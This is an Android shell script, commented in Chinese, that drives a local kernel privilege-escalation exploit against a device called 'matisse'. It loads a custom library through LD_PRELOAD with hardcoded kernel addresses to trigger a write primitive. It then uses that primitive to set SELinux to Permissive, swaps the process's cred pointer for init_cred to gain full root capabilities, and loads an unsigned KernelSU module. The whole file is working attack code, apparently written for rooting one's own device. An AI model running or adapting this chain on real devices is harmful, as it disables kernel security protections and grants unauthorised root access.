#!/system/bin/sh
# mt47 终局三步: R0 判活 → ENF 全局 Permissive → PTR cred指针→init_cred(满caps)
#
# 顺序原理 (ELF 实证, 见 MT47_ROUTE_DECISION_2026-08-16.md):
#   - ENF 先做: sel_write_enforce 只查 avc SID(与 caps/uid 无关),
#     用户态 setenforce 不可靠 → mt26 零写是唯一正路; 先翻全局 Permissive,
#     之后 root 子进程的 insmod 重试无时序竞争
#   - PTR 后做: STORE(a) [task+0x780]=init_cred 一发拿满 caps(0x1fffffffffffffff)
#     + 全部 id=0; 子进程 CapEff 命中 → setresuid(0) 私有化 cred →
#     PSELECT_KO 存在则 finit_module 重试(签名不强制, is_module_sig_enforced=0)
#   - FIX 可选: init_cred usage/uid 被 STORE(b) 副作用污染(无害), 预算富余再补
#
# 预算: R0(1) + ENF(≤4) + PTR(≤4) = ≤9 轮, 与 8-16 上午成功 boot 的预算一致
# 判读:
#   R0 灭 → 换 boot, 别浪费后续轮
#   ENF 4轮仍 Enforcing → 零写在 selinux_state 不落地(新卡点), PTR 照跑但 insmod 会卡 avc
#   PTR 后 root_alive 出现 → ★ cred 指针路线成立
#   PTR 后 ksu_done 出现 → ★★★★ 终局达成

SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt47.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt47_root.txt
RUNLOG=/data/local/tmp/mt47_run.out
KO=/data/local/tmp/kernelsu.ko

rm -f $DST; cp $SRC $DST; sync
BID0=$(cat /proc/sys/kernel/random/boot_id)
rm -f /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt
rm -f /data/local/tmp/root_marker.txt /data/local/tmp/root_shell.txt
echo "start $(date +%H:%M:%S) boot_before=$BID0 enforce=$(getenforce)" > $LOG
am kill-all 2>&1 | tail -1 >> $LOG

echo "=== R0: liveness oracle ===" >> $LOG
rm -f $RUNLOG
timeout 120 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_RETRY=1 \
  PSELECT_TREE_PC=ffffff8002a60bb0 \
  PSELECT_TREE_LEFT=0 \
  LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
BID=$(cat /proc/sys/kernel/random/boot_id)
echo "R0 rc=$? boot_id=$BID" >> $LOG
if [ "$BID" = "$BID0" ]; then
  echo "!! R0: 原语未激活 — 直接换 boot 重跑, 后续 8 轮别浪费" >> $LOG
  exit 1
fi
sleep 3

echo "=== ENF: 全局 Permissive (mt26 配方) ===" >> $LOG
E=0
while [ "$(getenforce 2>/dev/null)" = "Enforcing" ] && [ $E -lt 4 ]; do
  E=$((E+1))
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a41b90 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "ENF round=$E rc=$? enforce=$(getenforce)" >> $LOG
  grep -a 'futex trigger\|WRITE PRIMITIVE' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  sleep 3
done

echo "=== PTR: cred 指针 → init_cred ===" >> $LOG
KOARG=""
[ -f $KO ] && KOARG="PSELECT_KO=$KO"
[ -n "$KOARG" ] && echo "ko found: $KO" >> $LOG || echo "no ko at $KO (只验 root, 不 insmod)" >> $LOG
P=0
while [ ! -f /data/local/tmp/root_alive.txt ] && [ ! -f /data/local/tmp/ksu_done.txt ] && [ $P -lt 4 ]; do
  P=$((P+1))
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_PTR_MODE=1 \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "PTR round=$P rc=$?" >> $LOG
  grep -a 'mt47:\|mt39:\|mt40:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  [ -f /data/local/tmp/root_alive.txt ] && echo "★★★ PTR round=$P ROOT-ALIVE: $(cat /data/local/tmp/root_alive.txt) ★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && echo "★★★★ PTR round=$P KSU-LOADED ★★★★" >> $LOG
  sleep 3
done

# === 可选 FIX 轮 (预算富余才放开) ===
# rm -f $RUNLOG
# timeout 120 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
#   PSELECT_RETRY=1 PSELECT_FIX_MODE=1 \
#   LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
# echo "FIX rc=$?" >> $LOG

sleep 5
echo "=== final uid=$(id -u) enforce=$(getenforce) root_alive=$([ -f /data/local/tmp/root_alive.txt ] && echo YES || echo no) ksu=$([ -f /data/local/tmp/ksu_done.txt ] && echo YES || echo no) ===" >> $LOG
echo "=== DONE $(date +%H:%M:%S) ===" >> $LOG
